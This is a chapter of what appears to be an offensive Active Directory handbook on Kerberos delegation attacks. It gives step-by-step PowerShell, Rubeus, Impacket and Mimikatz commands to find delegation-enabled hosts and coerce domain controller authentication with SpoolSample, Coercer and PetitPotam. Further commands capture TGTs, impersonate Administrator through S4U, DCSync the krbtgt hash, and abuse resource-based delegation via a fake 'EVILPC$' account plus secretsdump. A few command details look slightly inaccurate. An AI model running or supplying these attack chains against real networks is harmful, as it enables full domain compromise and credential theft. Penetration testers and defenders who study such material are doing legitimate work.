# 05 — Kerberos Delegation Attacks

[← Back to index](README.md)

## 5.1 Delegation Types Overview

| Type | UAC Flag | Risk | Attack Path |
|------|----------|------|-------------|
| Unconstrained Delegation | `524288` (TRUSTED_FOR_DELEGATION) | Critical | Capture TGTs of any user connecting to service; coerce DC auth → dump krbtgt |
| Constrained Delegation (Kerberos) | `16777216` (TRUSTED_TO_AUTH_FOR_DELEGATION) | High | S4U2Self + S4U2Proxy to impersonate any user to allowed services |
| Constrained Delegation (any auth) | Same + `AllowedToDelegateTo` set | High | S4U2Self does not require target's TGT — more powerful |
| Resource-Based Constrained (RBCD) | `msDS-AllowedToActOnBehalfOfOtherIdentity` | High | Write `msDS-AITABOOI` on target → create computer account → full DA path |

## 5.2 Unconstrained Delegation

Computers/users with unconstrained delegation cache any user's TGT when they authenticate
to it. If you compromise such a machine, you can extract these TGTs — **including the DC's
TGT when coerced to authenticate**.

```powershell
# Find unconstrained delegation computers
Get-NetComputer -Unconstrained | Select-Object dnshostname
```

```bash
impacket-findDelegation $DOMAIN/$USER:$PASS -dc-ip $DC_IP

ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' '(userAccountControl:1.2.840.113556.1.4.803:=524288)' sAMAccountName
```

```powershell
# Monitor for TGTs on unconstrained delegation machine (Rubeus)
.\Rubeus.exe monitor /interval:5 /nowrap
```

```bash
# Coerce DC authentication (PrinterBug / SpoolSample)
# Run from attacker (listening with Rubeus monitor on delegation machine)
python3 SpoolSample.py DC01.corp.local DELEGATION_HOST
```

```powershell
.\SpoolSample.exe DC01.corp.local DELEGATION_HOST.corp.local
```

```bash
# Coerce with Coercer (all protocols)
python3 Coercer.py coerce -l DELEGATION_HOST -t $DC_IP -u $USER -p $PASS -d $DOMAIN

# PetitPotam (EFSRPC — no auth needed on older systems)
python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS DELEGATION_HOST $DC_IP
```

```powershell
# Export captured TGT (Rubeus on delegation machine)
.\Rubeus.exe dump /nowrap /service:krbtgt
.\Rubeus.exe dump /user:DC01$ /nowrap

# Use captured DC TGT → DCSync
.\Rubeus.exe ptt /ticket:DC01_TGT.b64
.\Mimikatz.exe 'lsadump::dcsync /domain:corp.local /user:krbtgt' exit
```

## 5.3 Constrained Delegation

Constrained delegation allows a service to impersonate users, but only to specific target
services listed in `msDS-AllowedToDelegateTo`.

```powershell
# Find constrained delegation accounts
Get-NetComputer -TrustedToAuth | Select-Object dnshostname, msdsallowedtodelegateto
Get-NetUser -TrustedToAuth | Select-Object sAMAccountName, msdsallowedtodelegateto
```

```bash
impacket-findDelegation $DOMAIN/$USER:$PASS -dc-ip $DC_IP
```

```powershell
# S4U2Self + S4U2Proxy attack (Rubeus)
# First get TGT for the delegation account
.\Rubeus.exe asktgt /user:svc_constrained /ntlm:$HASH /ptt

# Impersonate Administrator to allowed service
.\Rubeus.exe s4u /ticket:TGT.b64 /impersonateuser:Administrator \
    /msdsspn:cifs/DC01.corp.local /ptt

# If delegation is to LDAP — DCSync
.\Rubeus.exe s4u /ticket:TGT.b64 /impersonateuser:Administrator \
    /msdsspn:ldap/DC01.corp.local /ptt
.\Mimikatz.exe 'lsadump::dcsync /domain:corp.local /user:krbtgt' exit

# Alternate service trick (if MSSQLSvc → cifs is possible)
.\Rubeus.exe s4u /ticket:TGT.b64 /impersonateuser:Administrator \
    /msdsspn:MSSQLSvc/SQL01.corp.local /altservice:cifs /ptt
```

```bash
# From Linux — Impacket
# Get TGT for delegation account
impacket-getTGT $DOMAIN/svc_constrained -hashes ':$HASH' -dc-ip $DC_IP
export KRB5CCNAME=svc_constrained.ccache

# S4U2Self + S4U2Proxy
impacket-getST $DOMAIN/svc_constrained -dc-ip $DC_IP -spn cifs/DC01.corp.local \
    -impersonate Administrator -hashes ':$HASH'
export KRB5CCNAME=Administrator@cifs_DC01.ccache
impacket-smbclient -k -no-pass $DOMAIN/Administrator@DC01.corp.local
```

## 5.4 Resource-Based Constrained Delegation (RBCD)

RBCD abuse: if you can write to `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer
account, you can configure RBCD to impersonate any user to that computer — even Domain
Admin.

```text
# PREREQUISITES:
# 1. Write permissions on target computer (GenericWrite, GenericAll, WriteProperty on msDS-AITABOOI)
# 2. Control over a computer or service account (or create one — MachineAccountQuota > 0)
# 3. Impacket or Rubeus
```

```bash
# Step 1 — Check MachineAccountQuota (default = 10, allows non-admins to join computers)
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' '(objectClass=domain)' ms-DS-MachineAccountQuota

# Step 2 — Create a fake computer account
impacket-addcomputer $DOMAIN/$USER:$PASS -dc-ip $DC_IP -computer-name 'EVILPC$' -computer-pass 'EvilPass123!'

# Step 3 — Set RBCD on target — configure EVILPC to act on behalf of TARGET_COMPUTER
impacket-rbcd $DOMAIN/$USER:$PASS -dc-ip $DC_IP \
    -action write -delegate-to TARGET_COMPUTER$ -delegate-from EVILPC$

# Step 4 — Get TGT for EVILPC
impacket-getTGT $DOMAIN/EVILPC$ -dc-ip $DC_IP -hashes ':EVILPC_HASH'
export KRB5CCNAME=EVILPC.ccache

# Step 5 — S4U2Self + S4U2Proxy → get service ticket as Administrator
impacket-getST $DOMAIN/EVILPC$ -dc-ip $DC_IP \
    -spn cifs/TARGET_COMPUTER.corp.local \
    -impersonate Administrator \
    -hashes ':EVILPC_HASH'

# Step 6 — Use ticket
export KRB5CCNAME=Administrator@cifs_TARGET.ccache
impacket-secretsdump -k -no-pass $DOMAIN/Administrator@TARGET_COMPUTER.corp.local
```

```powershell
# From Windows — PowerView + Rubeus
# Set RBCD
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList 'O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;EVILPC_SID)'
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity TARGET_COMPUTER -XOR @{'msdsallowedtoactonbehalfofotheridentity'=$SDBytes}

# OR with PowerMad
Get-ADComputer TARGET_COMPUTER -properties PrincipalsAllowedToDelegateToAccount

Set-ADComputer TARGET_COMPUTER -PrincipalsAllowedToDelegateToAccount EVILPC$
```

---

[← Prev: 04 — Password Attacks & Credential Abuse](04-password-attacks-and-credential-abuse.md) | [Next: 06 — ACL / DACL Abuse →](06-acl-dacl-abuse.md)
